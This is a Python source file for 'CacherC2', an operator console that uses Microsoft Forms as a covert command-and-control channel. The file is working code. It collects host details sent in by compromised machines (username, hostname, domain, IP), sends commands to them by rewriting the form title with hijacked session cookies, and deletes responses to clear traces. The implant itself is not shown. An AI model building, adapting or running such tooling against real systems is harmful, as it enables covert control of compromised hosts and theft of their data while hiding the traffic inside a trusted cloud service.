#!/usr/bin/env python3

from __future__ import annotations

import argparse
import base64
import json
import os
import re
import socket
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid as uuid_mod
from http.cookiejar import CookieJar
from typing import Any, Iterable

try:
    from dotenv import load_dotenv
except ImportError:
    load_dotenv = None

try:
    from dotenv import load_dotenv
except ImportError:
    load_dotenv = None

# Try to import readline for better terminal handling (Unix/Linux/Mac)
try:
    import readline
    HAS_READLINE = True
except ImportError:
    HAS_READLINE = False

BANNER = r"""
[37m  _______            __              [91m _______ _______ [0m
[37m |   _   .---.-.----|  |--.-----.----[91m|   _   |       |[0m
[37m |.  1___|  _  |  __|     |  -__|   _[91m|.  1___|___|   |[0m
[37m |.  |___|___._|____|__|__|_____|__| [91m|.  |___ /  ___/ [0m
[37m |:  1   |                           [91m|:  1   |:  1  \ [0m
[37m |::.. . |                           [91m|::.. . |::.. . |[0m
[37m `-------'                           [91m`-------`-------'[0m


 [37mCacherC2::Microsoft Forms as a Command and Control ([91mC2[37m)[0m
 [94mby vnxdtzip[0m
""".replace("[", "\033[")

def print_banner() -> None:
    print(BANNER)

# Lifetime: it dies roughly 1 hour after being issued. When 401s start showing up,
# collect the cookie again from DevTools (instructions at the top of this file).
# The `OIDCAuth.forms/AADAuth.forms` cookie: the browsing session itself.

if load_dotenv:
    load_dotenv()

OIDC_AUTH = os.getenv("OIDC_AUTH", "").strip()
AAD_AUTH = os.getenv("AAD_AUTH", "").strip()

COOKIE = f"OIDCAuth.forms={OIDC_AUTH}; AADAuth.forms={AAD_AUTH}"

# Host used to build the response page URL. Redirects are followed, so a tenant living
# on forms.office.com is picked up from there on.
FORMS_HOST = "https://forms.cloud.microsoft"

COLUMNS = [
    "Username",
    "Hostname",
    "Domain",
    "IsDomainJoined",
    "LocalIP",
    "UUID",
    "DateTime",
    "Last Seen",
    "Response",
]

KEY_COLUMN = "UUID"
VISIBLE_COLUMNS = ["Username", "Hostname", "Domain", "UUID", "Last Seen"]
VERTICAL_OUTPUT = False
POLL_INTERVAL = 3.0
LOG_PATH: str | None = None
MAX_CELL_WIDTH = 40
MIN_TERMINAL_WIDTH = 80

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
)


class FormsError(RuntimeError):
    def __init__(self, msg: str, fatal: bool = False):
        super().__init__(msg)
        self.fatal = fatal


def enable_ansi() -> bool:
    if os.name != "nt":
        return True
    try:
        import ctypes

        k32 = ctypes.windll.kernel32
        handle = k32.GetStdHandle(-11)
        mode = ctypes.c_uint32()
        if not k32.GetConsoleMode(handle, ctypes.byref(mode)):
            return False
        ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
        return bool(k32.SetConsoleMode(handle, mode.value | ENABLE_VIRTUAL_TERMINAL_PROCESSING))
    except Exception:
        return False


def clear_screen(use_ansi: bool) -> None:
    if use_ansi:
        # Cursor to the top + erase downwards. Redraws without the cls flicker.
        print("\033[H\033[J", end="")
    else:
        os.system("cls" if os.name == "nt" else "clear")


class ConsoleIO:

    def __init__(self, use_ansi: bool):
        self.use_ansi = use_ansi
        self._lock = threading.RLock()
        self._reading = False
        self._prompt = ""
        self._buffer: list[str] = []
        self._cursor = 0
        self._history: list[str] = []
        self._history_index = 0
        self._windows_console = (
            os.name == "nt" and sys.stdin.isatty() and sys.stdout.isatty()
        )

    def _clear_line(self) -> None:
        if self.use_ansi:
            sys.stdout.write("\r\033[2K")
        else:
            try:
                import shutil

                width = max(80, shutil.get_terminal_size().columns)
            except Exception:
                width = 120
            sys.stdout.write("\r" + (" " * width) + "\r")

    def _redraw_windows_line(self) -> None:
        self._clear_line()
        text = "".join(self._buffer)
        sys.stdout.write(self._prompt + text)

        chars_to_move_left = len(text) - self._cursor
        if chars_to_move_left > 0:
            if self.use_ansi:
                sys.stdout.write(f"\033[{chars_to_move_left}D")
            else:
                sys.stdout.write("\b" * chars_to_move_left)
        sys.stdout.flush()

    def _finish_windows_input(self) -> str:
        value = "".join(self._buffer)
        if value and (not self._history or self._history[-1] != value):
            self._history.append(value)

        self._reading = False
        self._prompt = ""
        self._buffer = []
        self._cursor = 0
        self._history_index = len(self._history)
        return value

    def _windows_input(self, prompt: str) -> str:
        import msvcrt

        with self._lock:
            self._reading = True
            self._prompt = prompt
            self._buffer = []
            self._cursor = 0
            self._history_index = len(self._history)
            sys.stdout.write(prompt)
            sys.stdout.flush()

        while True:
            ch = msvcrt.getwch()

            if ch in ("\x00", "\xe0"):
                special = msvcrt.getwch()
                with self._lock:
                    if special == "K" and self._cursor > 0:  # left
                        self._cursor -= 1
                    elif special == "M" and self._cursor < len(self._buffer):  # right
                        self._cursor += 1
                    elif special == "G":  # home
                        self._cursor = 0
                    elif special == "O":  # end
                        self._cursor = len(self._buffer)
                    elif special == "S" and self._cursor < len(self._buffer):  # delete
                        del self._buffer[self._cursor]
                    elif special == "H" and self._history:  # up
                        if self._history_index > 0:
                            self._history_index -= 1
                        value = self._history[self._history_index]
                        self._buffer = list(value)
                        self._cursor = len(self._buffer)
                    elif special == "P" and self._history:  # down
                        if self._history_index < len(self._history) - 1:
                            self._history_index += 1
                            value = self._history[self._history_index]
                        else:
                            self._history_index = len(self._history)
                            value = ""
                        self._buffer = list(value)
                        self._cursor = len(self._buffer)
                    self._redraw_windows_line()
                continue

            with self._lock:
                if ch in ("\r", "\n"):
                    sys.stdout.write("\n")
                    sys.stdout.flush()
                    return self._finish_windows_input()

                if ch == "\x03":  # Ctrl+C
                    sys.stdout.write("^C\n")
                    sys.stdout.flush()
                    self._finish_windows_input()
                    raise KeyboardInterrupt

                if ch == "\x1a" and not self._buffer:  # Ctrl+Z
                    sys.stdout.write("\n")
                    sys.stdout.flush()
                    self._finish_windows_input()
                    raise EOFError

                changed = False
                if ch == "\x08":  # backspace
                    if self._cursor > 0:
                        self._cursor -= 1
                        del self._buffer[self._cursor]
                        changed = True
                elif ch == "\x01":  # Ctrl+A
                    self._cursor = 0
                    changed = True
                elif ch == "\x05":  # Ctrl+E
                    self._cursor = len(self._buffer)
                    changed = True
                elif ch == "\x15":  # Ctrl+U
                    self._buffer = []
                    self._cursor = 0
                    changed = True
                elif ch == "\t":
                    for char in "    ":
                        self._buffer.insert(self._cursor, char)
                        self._cursor += 1
                    changed = True
                elif ch.isprintable():
                    self._buffer.insert(self._cursor, ch)
                    self._cursor += 1
                    changed = True

                if changed:
                    self._redraw_windows_line()

    def input(self, prompt: str) -> str:
        if self._windows_console:
            return self._windows_input(prompt)

        with self._lock:
            self._reading = True
            self._prompt = prompt

        try:
            return input(prompt)
        finally:
            with self._lock:
                self._reading = False
                self._prompt = ""

    def notify(self, text: str) -> None:
        """Print a monitor message and immediately restore the active prompt."""
        with self._lock:
            if self._windows_console and self._reading:
                self._clear_line()
                sys.stdout.write(text + "\n")
                self._redraw_windows_line()
                return

            if HAS_READLINE and self._reading:
                try:
                    line_buffer = readline.get_line_buffer()
                    self._clear_line()
                    sys.stdout.write(text + "\n")
                    sys.stdout.write(self._prompt + line_buffer)
                    sys.stdout.flush()
                    readline.redisplay()
                    return
                except Exception:
                    pass

            if self._reading:
                self._clear_line()
                sys.stdout.write(text + "\n" + self._prompt)
                sys.stdout.flush()
            else:
                print(text, flush=True)


def resolve_form_identity(form_id: str, opener: urllib.request.OpenerDirector) -> dict:
    padded = form_id.replace("-", "+").replace("_", "/")
    padded += "=" * (-len(padded) % 4)
    try:
        raw = base64.b64decode(padded)
    except Exception as e:
        raise FormsError(f"'{form_id}' is not a valid form id: it does not decode as base64url.") from e

    if len(raw) <= 32:
        raise FormsError(
            f"The form id decoded to {len(raw)} bytes - too short to hold "
            "tenant + owner + form."
        )

    url = f"{FORMS_HOST}/Pages/ResponsePage.aspx?id={urllib.parse.quote(form_id, safe='')}"
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    with opener.open(req) as resp:
        final_url = resp.geturl()
        resp.read()

    parsed = urllib.parse.urlparse(final_url)
    return {
        "tenant_id": str(uuid_mod.UUID(bytes_le=raw[0:16])),
        "owner_id": str(uuid_mod.UUID(bytes_le=raw[16:32])),
        "form_id": form_id,
        "page_url": final_url,
        "base_url": f"{parsed.scheme}://{parsed.netloc}",
    }


def api_root(form: dict) -> str:
    return (
        f"{form['base_url']}/formapi/api/{form['tenant_id']}"
        f"/users/{form['owner_id']}"
    )


def headers_for(form: dict, cookie: str | None = None) -> dict:
    h = {
        "Accept": "application/json",
        "User-Agent": UA,
        "Referer": form["page_url"],
        "Origin": form["base_url"],
        "x-ms-form-request-ring": "business",
        "x-ms-form-request-source": "ms-formweb",
    }
    if cookie:
        h["Cookie"] = cookie
    return h


def fetch_json(url: str, form: dict, cookie: str | None, opener=None, attempts: int = 3) -> Any:
    req = urllib.request.Request(url, headers=headers_for(form, cookie))
    open_fn = opener.open if opener else urllib.request.urlopen

    for attempt in range(1, attempts + 1):
        try:
            with open_fn(req) as resp:
                return json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            if e.code in (401, 403):
                raise FormsError(
                    f"The server answered {e.code} while listing the responses.\n"
                    "Listing responses requires the OWNER's session - anonymous has no "
                    "access, and the cookie expires in about 1 h. Refresh the COOKIE "
                    "constant at the top of this file.",
                    fatal=True,
                ) from e

            if e.code >= 500 and attempt < attempts:
                print(
                    f"  transient HTTP {e.code}, attempt {attempt}/{attempts}...",
                    file=sys.stderr,
                )
                time.sleep(1.5 * attempt)
                continue

            body = e.read()[:400].decode("utf-8", "replace")
            raise FormsError(f"HTTP {e.code} at {url}\n{body}") from e

    raise FormsError(f"Failed after {attempts} attempts: {url}")

def get_question_ids(form: dict, opener) -> list[str]:
    url = (
        f"{api_root(form)}/light/runtimeForms('{form['form_id']}')"
        "?$expand=questions($expand=choices)"
    )
    data = fetch_json(url, form, cookie=None, opener=opener)
    questions = sorted(data.get("questions") or [], key=lambda q: q.get("order", 0))
    return [q["id"] for q in questions]


def get_antiforgery(form: dict, cookie: str) -> tuple[str, str]:
    url = (
        f"{form['base_url']}/Pages/DesignPageV2.aspx"
        f"?origin=NeoPortalPage&subpage=design&id={form['form_id']}"
    )
    jar = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    req = urllib.request.Request(url, headers={"User-Agent": UA, "Cookie": cookie})

    try:
        with opener.open(req) as resp:
            html = resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        raise FormsError(
            f"HTTP {e.code} while opening the design page to get the antiforgery token.",
            fatal=(e.code in (401, 403)),
        ) from e

    m = re.search(r'"antiForgeryToken"\s*:\s*"([^"]+)"', html)
    if not m:
        raise FormsError(
            "Could not find antiForgeryToken in the design page. Forms may have changed "
            "the format - look for 'antiForgeryToken' in the HTML of the edit page."
        )

    rvt = next((c.value for c in jar if c.name == "__RequestVerificationToken"), None)
    if not rvt:
        raise FormsError(
            "The design page did not issue the __RequestVerificationToken cookie. "
            "Without the cookie+header pair the PATCH comes back 403."
        )

    return m.group(1), f"{cookie}; __RequestVerificationToken={rvt}"


def set_form_title(form: dict, cookie: str, token: str, title: str) -> None:
    url = f"{form['base_url']}/formapi/api/{form['tenant_id']}/users/{form['owner_id']}/forms('{form['form_id']}')"

    headers = headers_for(form, cookie)
    headers.update(
        {
            "__requestverificationtoken": token,
            "odata-maxverion": "4.0",
            "odata-version": "4.0",
            "Content-Type": "application/json;odata.metadata=minimal;odata.streaming=true",
        }
    )

    req = urllib.request.Request(
        url,
        data=json.dumps({"title": title, "formsProRTTitle": title}).encode("utf-8"),
        method="PATCH",
        headers=headers,
    )
    try:
        urllib.request.urlopen(req).read()
    except urllib.error.HTTPError as e:
        body = e.read()[:250].decode("utf-8", "replace")
        raise FormsError(f"HTTP {e.code} while changing the title.\n{body}") from e


def delete_response(form: dict, cookie: str, token: str, response_id: int) -> None:
    url = f"{api_root(form)}/forms('{form['form_id']}')/responses({int(response_id)})"

    headers = headers_for(form, cookie)
    headers.update(
        {
            "__requestverificationtoken": token,
            "odata-maxverion": "4.0",
            "odata-version": "4.0",
        }
    )

    req = urllib.request.Request(url, method="DELETE", headers=headers)
    try:
        urllib.request.urlopen(req).read()
    except urllib.error.HTTPError as e:
        body = e.read()[:250].decode("utf-8", "replace")
        raise FormsError(f"HTTP {e.code} while deleting response {response_id}.\n{body}") from e


class FormWriter:
    def __init__(self, form: dict, cookie: str):
        self.form = form
        self.cookie = cookie
        self._pair: tuple[str, str] | None = None

    def prepare(self) -> tuple[str, str]:
        if self._pair is None:
            self._pair = get_antiforgery(self.form, self.cookie)
        return self._pair

    def call(self, action):
        token, write_cookie = self.prepare()
        try:
            return action(token, write_cookie)
        except FormsError:
            self._pair = None
            token, write_cookie = self.prepare()
            return action(token, write_cookie)


def build_title(current_title: str, key: str, message: str) -> str:
    m = re.match(r"^(.*?)\[", current_title or "")
    prefix = m.group(1) if m else "# "
    return f"{prefix}[{key}] {message}"


def get_form_title(form: dict, cookie: str) -> str:
    url = (
        f"{form['base_url']}/formapi/api/{form['tenant_id']}/users/{form['owner_id']}"
        f"/forms('{form['form_id']}')?$select=id,title"
    )
    return fetch_json(url, form, cookie).get("title") or ""


def get_responses(form: dict, cookie: str) -> list[dict]:
    url = f"{api_root(form)}/forms('{form['form_id']}')/responses"
    all_rows: list[dict] = []

    while url:
        data = fetch_json(url, form, cookie)
        all_rows.extend(data.get("value") or [])
        url = data.get("@odata.nextLink")

    return all_rows


def format_submit_date(submit_date_str: str) -> str:
    if not submit_date_str:
        return ""
    try:
        from datetime import datetime, timedelta, timezone
        dt = datetime.fromisoformat(submit_date_str.replace("Z", "+00:00"))
        utc3 = timezone(timedelta(hours=-3))
        dt = dt.astimezone(utc3)
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return submit_date_str

def response_to_row(resp: dict, question_ids: list[str]) -> dict:
    try:
        answers = json.loads(resp.get("answers") or "[]")
    except json.JSONDecodeError:
        answers = []

    by_id = {a.get("questionId"): a.get("answer1", "") for a in answers}

    row = {}
    for i, name in enumerate(COLUMNS):
        qid = question_ids[i] if i < len(question_ids) else None
        if name == "Last Seen":
            row[name] = format_submit_date(resp.get("submitDate") or "")
        else:
            row[name] = by_id.get(qid, "") if qid else ""

    row["_id"] = resp.get("id")
    row["_submitDate"] = resp.get("submitDate") or ""
    return row


def latest_by_key(rows: Iterable[dict]) -> list[dict]:
    best: dict[str, dict] = {}
    counts: dict[str, int] = {}

    for row in rows:
        key = row.get(KEY_COLUMN) or "(no value)"
        counts[key] = counts.get(key, 0) + 1

        current = best.get(key)
        if current is None or (row["_submitDate"], row["_id"] or 0) > (
            current["_submitDate"],
            current["_id"] or 0,
        ):
            best[key] = row

    for key, row in best.items():
        row["_total"] = counts[key]

    return sorted(best.values(), key=lambda r: (r["_submitDate"], r["_id"] or 0))

def render_table(
    rows: list[dict],
    visible: list[str] | None = None,
    extras: tuple[str, ...] = (),
) -> str:
    import shutil

    columns = (visible if visible is not None else VISIBLE_COLUMNS) + list(extras)

    def cell(row, name):
        if name == "Total":
            return str(row.get("_total", ""))
        if name == "Id":
            return str(row.get("_id", ""))
        return str(row.get(name, ""))

    def truncate(text: str, width: int) -> str:
        if len(text) > width:
            return text[:max(3, width - 3)] + "..." if width > 3 else "..."
        return text

    terminal_width = shutil.get_terminal_size().columns
    max_available_width = terminal_width - (len(columns) * 3)

    if max_available_width < len(columns) * 10:
        return render_vertical(rows, visible)

    widths = []
    for c in columns:
        header_len = len(c)
        cell_lens = [len(cell(r, c)) for r in rows] if rows else []
        max_len = max(header_len, *cell_lens) if cell_lens else header_len
        limited_width = min(max_len, MAX_CELL_WIDTH)
        widths.append(limited_width)

    sep = "-+-".join("-" * w for w in widths)
    out = [
        " | ".join(truncate(c, w).ljust(w) for c, w in zip(columns, widths)),
        sep,
    ]
    out += [
        " | ".join(truncate(cell(r, c), w).ljust(w) for c, w in zip(columns, widths))
        for r in rows
    ]
    return "\n".join(out)


def render_vertical(rows: list[dict], visible: list[str] | None = None) -> str:
    columns = visible if visible is not None else VISIBLE_COLUMNS
    width = max(len(c) for c in columns)
    blocks = []

    for row in rows:
        head = f"UUID {row.get(KEY_COLUMN) or '(no value)'}"
        body = "\n".join(f"  {c.ljust(width)} : {row.get(c, '')}" for c in columns)
        blocks.append(f"{head}\n{body}")

    return "\n\n".join(blocks)

class Monitor:

    def __init__(self, form: dict, cookie: str, question_ids: list[str],
                 interval: float, console: ConsoleIO, log_path: str | None = None):
        self.form = form
        self.cookie = cookie
        self.question_ids = question_ids
        self.interval = interval
        self.console = console
        self.log_path = log_path

        self._lock = threading.Lock()
        self._rows: dict[int, dict] = {}
        self._keys: set[str] = set()
        self._stop = threading.Event()
        self.fatal_error: FormsError | None = None

        # Interact mode: while `focus` points at a UUID, the monitor swaps the [+]
        # lines of that UUID for the content of its Response field, and only speaks
        # when the value changes. `_last_response` holds the last one shown.
        self.focus: str | None = None
        self._last_response: str | None = None

    # -- collection --------------------------------------------------------

    def _fetch(self) -> list[dict]:
        raw = get_responses(self.form, self.cookie)
        return [response_to_row(r, self.question_ids) for r in raw]

    def load_initial(self) -> int:
        rows = self._fetch()
        with self._lock:
            for row in rows:
                self._rows[row["_id"]] = row
                self._keys.add(self._key(row))
        return len(rows)

    @staticmethod
    def _key(row: dict) -> str:
        return str(row.get(KEY_COLUMN) or "(no value)")

    def snapshot(self) -> list[dict]:
        with self._lock:
            return list(self._rows.values())

    # -- notification ------------------------------------------------------

    def _report(self, msg: str) -> None:
        stamp = time.strftime("%H:%M:%S")
        self.console.notify(f"{stamp} {msg}")

        if self.log_path:
            with open(self.log_path, "a", encoding="utf-8") as fh:
                fh.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}\n")

    def _describe(self, row: dict) -> str:
        key = self._key(row)
        user = row.get("Username") or "(no username)"

        if key in self._keys:
            # Bytes of what came in the Response field, measured in UTF-8: the real
            # transmitted size, not the character count (an accent takes 2).
            byte_count = len(str(row.get("Response") or "").encode("utf-8"))
            return f"\033[92m[+]\033[0m Received from {key}/{user} with {byte_count} bytes"

        self._keys.add(key)
        return f"\033[92m[+]\033[0m New host: {key}/{user}"

    # -- loop --------------------------------------------------------------

    def run(self) -> None:
        while not self._stop.wait(self.interval):
            try:
                rows = self._fetch()
            except FormsError as e:
                if e.fatal:
                    self.fatal_error = e
                    self._report(f"\033[91m[!]\033[0m {e}")
                    return
                self._report(f"\033[91m[!]\033[0m Read failed: {e}")
                continue

            with self._lock:
                new_rows = [r for r in rows if r["_id"] not in self._rows]
                for row in sorted(new_rows, key=lambda r: r["_id"] or 0):
                    focused = self.focus is not None and self._key(row) == self.focus
                    msg = self._describe(row)
                    self._rows[row["_id"]] = row
                    if not focused:
                        self._report(msg)

                if self.focus:
                    self._report_focus()

    def _report_focus(self) -> None:
        candidates = [r for r in self._rows.values() if self._key(r) == self.focus]
        if not candidates:
            return

        latest = max(candidates, key=lambda r: (r["_submitDate"], r["_id"] or 0))
        response = str(latest.get("Response") or "")

        if response == self._last_response:
            return

        self._last_response = response
        byte_count = len(response.encode("utf-8"))
        shown = response if response else "(empty)"
        self._report(f"\033[96m[<]\033[0m {self.focus}: \033[32m{shown}\033[0m  ({byte_count} bytes, id {latest['_id']})")

    def focus_on(self, key: str) -> None:
        with self._lock:
            self.focus = key
            candidates = [r for r in self._rows.values() if self._key(r) == key]
            if candidates:
                latest = max(candidates, key=lambda r: (r["_submitDate"], r["_id"] or 0))
                self._last_response = str(latest.get("Response") or "")
            else:
                self._last_response = None

    def unfocus(self) -> None:
        with self._lock:
            self.focus = None
            self._last_response = None

    def known_keys(self) -> set[str]:
        with self._lock:
            return set(self._keys)

    def rows_for(self, key: str) -> list[dict]:
        with self._lock:
            return [r for r in self._rows.values() if self._key(r) == key]

    def forget(self, response_ids: Iterable[int]) -> None:
        with self._lock:
            for response_id in response_ids:
                self._rows.pop(response_id, None)

            surviving = {self._key(r) for r in self._rows.values()}
            self._keys &= surviving

            if self.focus and self.focus not in surviving:
                # Nothing left to compare against: the next response from this UUID
                # has to read as a change, not as a repeat of what was deleted.
                self._last_response = None

    def stop(self) -> None:
        self._stop.set()


HELP = """Commands:
  list            redraws the table with the latest state
  info UUID       shows all information for a UUID in raw format
  all             lists all hosts, ungrouped (with Response and Id)
  interact UUID   opens the interaction prompt with that host
  delete UUID     deletes every of UUID, after confirmation
  clear           clears the screen
  help            this help
  exit            quits
"""

INTERACT_HELP = """In interact mode:
  <any command>   send command to host
  delete       delete the compromised host, after confirmation
  back         returns to the main prompt
"""


def delete_key(monitor: Monitor, writer: FormWriter, key: str) -> None:
    rows = monitor.rows_for(key)
    if not rows:
        print(f"\033[93m[!] No response from\033[0m '{key}' in the table.")
        return

    ids = sorted(r["_id"] for r in rows if r["_id"] is not None)
    print(f"\033[91m[!] About to delete host. This cannot be undone.")

    try:
        answer = monitor.console.input("Confirm? [y/N] ").strip().lower()
    except EOFError:
        answer = ""

    if answer not in ("y", "yes"):
        print("  \033[93mcancelled.\033[0m")
        return

    deleted: list[int] = []
    try:
        for response_id in ids:
            writer.call(
                lambda token, write_cookie, rid=response_id: delete_response(
                    monitor.form, write_cookie, token, rid
                )
            )
            deleted.append(response_id)
    except FormsError as e:
        print(f"  \033[91mstopped\033[0m after {len(deleted)} of {len(ids)}: {e}")
    finally:
        monitor.forget(deleted)

    if deleted:
        print(f"  \033[92m[*] {len(deleted)} response(s) deleted\033[0m from {key}.")


def show_info(monitor: Monitor, key: str) -> None:
    rows = monitor.rows_for(key)
    if not rows:
        print(f"\033[93m[!] No response from\033[0m '{key}' in the table.")
        return

    latest = max(rows, key=lambda r: (r["_submitDate"], r["_id"] or 0))
    body = render_vertical([latest], visible=[c for c in COLUMNS if c != "Response"])
    print(f"\n\033[96mInfo for UUID {key}\033[0m:\n")
    print(body)
    print()


def interact_mode(monitor: Monitor, form: dict, writer: FormWriter, cookie: str, key: str) -> None:

    try:
        writer.prepare()
    except FormsError as e:
        print(f"\033[91m[ERROR]\033[0m Could not prepare writing to the form: {e}")
        return

    monitor.focus_on(key)
    print(f"\n\033[96m[*] Interacting with\033[0m \033[97m{key}\033[0m. 'back' returns. 'help' lists the commands.")
    print(f"\033[94mCurrent title:\033[0m {get_form_title(form, cookie)!r}\n")

    try:
        while True:
            try:
                hostname = socket.gethostname()
                username = os.getenv("USERNAME", "user")
                prompt = f"\033[91m{hostname}\\{username} $> \033[0m"
                message = monitor.console.input(f"[interact] {key} {prompt}").strip().lstrip("﻿").strip()
            except EOFError:
                return

            if not message:
                continue
            if message.lower() in ("back", "exit", "quit", "q"):
                return
            if message.lower() in ("help", "?"):
                print(INTERACT_HELP)
                continue
            if message.lower() == "delete":
                delete_key(monitor, writer, key)
                # Exit interact mode if the host was deleted
                if not monitor.rows_for(key):
                    print(f"\033[93m[*] Host {key} has been deleted. Returning to main prompt.\033[0m")
                    return
                continue

            new_title = build_title(get_form_title(form, cookie), key, message)
            try:
                writer.call(
                    lambda token, write_cookie: set_form_title(
                        form, write_cookie, token, new_title
                    )
                )
            except FormsError as e:
                print(f"  \033[91mfailed:\033[0m {e}")
                continue

            print(f"  \033[92m[*] title ->\033[0m {new_title}")
    finally:
        monitor.unfocus()

def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser(
        description="Shows the latest response of each UUID of a Microsoft Forms form."
    )
    ap.add_argument(
        "form_id",
        nargs="?",
        default=os.getenv("FORM_ID", ""),
        help="Value of the `id=` query parameter of the form URL (not the full URL). Can also be set via FORM_ID env var.",
    )
    args = ap.parse_args(argv)

    print_banner()

    if not args.form_id:
        raise FormsError(
            "form_id is required. Pass it as an argument or set the FORM_ID environment variable."
        )

    # Both halves are checked here rather than left to come back as a 401, which says
    # nothing about which of the two is missing or malformed.
    for name, value in (("OIDC_AUTH", OIDC_AUTH), ("AAD_AUTH", AAD_AUTH)):
        if not value:
            raise FormsError(
                f"{name} is empty. Listing responses requires being the owner of the "
                "form.\nFill in both values at the top of this file - the instructions "
                "on how to copy them are in the module docstring."
            )
        if ";" in value or re.match(r"^[A-Za-z0-9_.-]+Auth\.forms=", value):
            raise FormsError(
                f"{name} looks like a whole Cookie header, not a single value. Paste "
                "only what comes after the '=' of that one cookie; the names are added "
                "when COOKIE is assembled."
            )
    if not AAD_AUTH.startswith("eyJ"):
        raise FormsError(
            "AAD_AUTH is not a JWT (it should start with 'eyJ'). The two values are "
            "probably swapped: OIDC_AUTH is the opaque one, AAD_AUTH is the token."
        )

    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(CookieJar()))

    form = resolve_form_identity(args.form_id, opener)
    question_ids = get_question_ids(form, opener)

    if len(question_ids) != len(COLUMNS):
        print(
            f"\033[93mWarning:\033[0m the form has {len(question_ids)} questions, but COLUMNS defines "
            f"{len(COLUMNS)} names. The leftovers stay empty or are ignored.",
            file=sys.stderr,
        )

    use_ansi = enable_ansi()
    console = ConsoleIO(use_ansi)
    monitor = Monitor(form, COOKIE, question_ids, POLL_INTERVAL, console, LOG_PATH)

    # Shared by both prompts so the antiforgery pair is fetched once, not per command.
    writer = FormWriter(form, COOKIE)

    def draw(raw: bool = False) -> None:
        rows = monitor.snapshot()

        if raw:
            # Inspection mode: shows everything, including Response and the response id.
            body = render_table(
                sorted(rows, key=lambda r: r["_id"] or 0),
                visible=COLUMNS,
                extras=("Id",),
            )
            summary = f"{len(rows)} responses"
        else:
            grouped = latest_by_key(rows)
            body = render_vertical(grouped) if VERTICAL_OUTPUT else render_table(grouped)
            summary = f"{len(grouped)} distinct UUIDs in {len(rows)} responses"

        header = f"\033[96mUpdated {time.strftime('%H:%M:%S')}\033[0m  |  {summary}"
        print(f"\n{header}\n\n{body}\n", flush=True)

    def resolve_target(command: str, usage: str) -> str | None:
        parts = command.split(None, 1)
        if len(parts) < 2:
            print(f"\033[94m{usage}\033[0m")
            return None

        target = parts[1].strip()
        known = monitor.known_keys()
        if target not in known:
            print(f"\033[93m[!] UUID\033[0m '\033[97m{target}\033[0m' is not in the table. Known: {', '.join(sorted(known)) or '(none)'}")
            return None

        return target

    total = monitor.load_initial()
    draw()

    print(
        f"\033[94m[*]\033[0m Monitoring every {POLL_INTERVAL:g}s ({total} responses already known). "
        "Type 'help' for the commands."
    )

    # daemon=True: if the prompt dies, the process is not stuck waiting on the thread.
    thread = threading.Thread(target=monitor.run, daemon=True)
    thread.start()

    while True:
        if monitor.fatal_error:
            raise monitor.fatal_error

        try:
            # The BOM is stripped because PowerShell prepends one to stdin when
            command = console.input("\033[91m>>\033[0m ").strip().lstrip("﻿").strip().lower()
        except EOFError:
            break

        if command in ("", "#"):
            continue
        if command in ("list", "l", "ls"):
            draw()
        elif command.startswith("info"):
            target = resolve_target(command, "Usage: info <UUID>")
            if target:
                show_info(monitor, target)
        elif command.startswith("interact"):
            target = resolve_target(command, "Usage: interact <UUID>")
            if target:
                interact_mode(monitor, form, writer, COOKIE, target)
        elif command.startswith("delete"):
            target = resolve_target(command, "Usage: delete <UUID>")
            if target:
                delete_key(monitor, writer, target)
        elif command in ("all", "raw"):
            draw(raw=True)
        elif command in ("clear", "cls"):
            clear_screen(use_ansi)
        elif command in ("help", "?"):
            print(HELP)
        elif command in ("exit", "quit", "q"):
            break
        else:
            print(f"\033[91m[!] Unknown command:\033[0m '{command}'. Type 'help'.")

    monitor.stop()
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main(sys.argv[1:]))
    except FormsError as e:
        print(f"\n\033[91m[ERROR]\033[0m {e}", file=sys.stderr)
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n\033[93m[*] Stopped.\033[0m", file=sys.stderr)
        sys.exit(130)